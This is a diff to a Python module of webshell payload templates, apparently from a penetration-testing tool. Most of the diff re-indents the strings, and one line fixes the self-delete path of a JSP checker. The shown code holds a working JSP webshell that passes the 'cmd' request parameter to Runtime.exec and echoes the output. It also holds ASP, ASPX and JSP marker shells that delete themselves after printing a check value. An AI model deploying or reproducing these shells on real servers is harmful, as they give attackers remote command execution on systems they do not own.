@@ -62,11 +62,11 @@ class AspShell(Webshell):
 
 class AspVerify(VerifyShell):
     _content = '<%\n' \
-               'Response.Write(Replace("202cTEST4b70","TEST",' \
-               '"b962ac59075b964b07152d23"))\n' \
-               'CreateObject("Scripting.FileSystemObject").' \
-               'DeleteFile(Request.ServerVariables("Path_Translated"))\n' \
-               '%>'
+        'Response.Write(Replace("202cTEST4b70","TEST",' \
+        '"b962ac59075b964b07152d23"))\n' \
+        'CreateObject("Scripting.FileSystemObject").' \
+        'DeleteFile(Request.ServerVariables("Path_Translated"))\n' \
+        '%>'
     _keyword = '202cb962ac59075b964b07152d234b70'
 
 
@@ -81,34 +81,34 @@ class AspxShell(Webshell):
 
 class AspxVerify(VerifyShell):
     _content = '<%@ Page Language="Jscript" ContentType="text/html" ' \
-               'validateRequest="false" aspcompat="true"%>\n' \
-               '<%Response.Write("202cTEST4b70".Replace("TEST",' \
-               '"b962ac59075b964b07152d23"))%>\n' \
-               '<%System.IO.File.Delete(Request.PhysicalPath);%>'
+        'validateRequest="false" aspcompat="true"%>\n' \
+        '<%Response.Write("202cTEST4b70".Replace("TEST",' \
+        '"b962ac59075b964b07152d23"))%>\n' \
+        '<%System.IO.File.Delete(Request.PhysicalPath);%>'
     _keyword = '202cb962ac59075b964b07152d234b70'
 
 
 class JspShell(Webshell):
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
-               '<%@ page import="java.io.*"%>\n' \
-               '<%@ page import="java.util.*"%>\n' \
-               '<%\n' \
-               'if (request.getParameter("check") == "1")\n' \
-               '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));\n' \
-               'if (request.getParameter("{0}") != null)\n' \
-               '{{\n' \
-               '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
-               '    OutputStream os = p.getOutputStream();\n' \
-               '    InputStream in = p.getInputStream();\n' \
-               '    DataInputStream dis = new DataInputStream(in);\n' \
-               '    String disr = dis.readLine();\n' \
-               '    while ( disr != null)\n' \
-               '    {{\n' \
-               '        out.println(disr);\n' \
-               '        disr = dis.readLine();\n' \
-               '    }}\n' \
-               '\n}}' \
-               '%>\n'
+        '<%@ page import="java.io.*"%>\n' \
+        '<%@ page import="java.util.*"%>\n' \
+        '<%\n' \
+        'if (request.getParameter("check") == "1")\n' \
+        '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));\n' \
+        'if (request.getParameter("{0}") != null)\n' \
+        '{{\n' \
+        '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
+        '    OutputStream os = p.getOutputStream();\n' \
+        '    InputStream in = p.getInputStream();\n' \
+        '    DataInputStream dis = new DataInputStream(in);\n' \
+        '    String disr = dis.readLine();\n' \
+        '    while ( disr != null)\n' \
+        '    {{\n' \
+        '        out.println(disr);\n' \
+        '        disr = dis.readLine();\n' \
+        '    }}\n' \
+        '\n}}' \
+        '%>\n'
     _password = 'cmd'
     _check_data = {'check': '1'}
     _keyword = '202cb962ac59075b964b07152d234b70'
@@ -116,17 +116,17 @@ class JspShell(Webshell):
 
 class JspVerify(VerifyShell):
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
-               '<%@ page import="java.io.*"%>\n' \
-               '<%@ page import="java.util.*"%>\n' \
-               '<%\n' \
-               'String path=request.getRealPath("");\n' \
-               'out.println(path);\n' \
-               'File d=new File(path);\n' \
-               'if(d.exists()){{\n' \
-               '  d.delete();\n' \
-               '  }}\n' \
-               '%>\n' \
-               '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));%>'
+        '<%@ page import="java.io.*"%>\n' \
+        '<%@ page import="java.util.*"%>\n' \
+        '<%\n' \
+        'String path=request.getRealPath("")+request.getServletPath();\n' \
+        'out.println(path);\n' \
+        'File d=new File(path);\n' \
+        'if(d.exists()){{\n' \
+        '  d.delete();\n' \
+        '  }}\n' \
+        '%>\n' \
+        '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));%>'
     _keyword = '202cb962ac59075b964b07152d234b70'
 
 
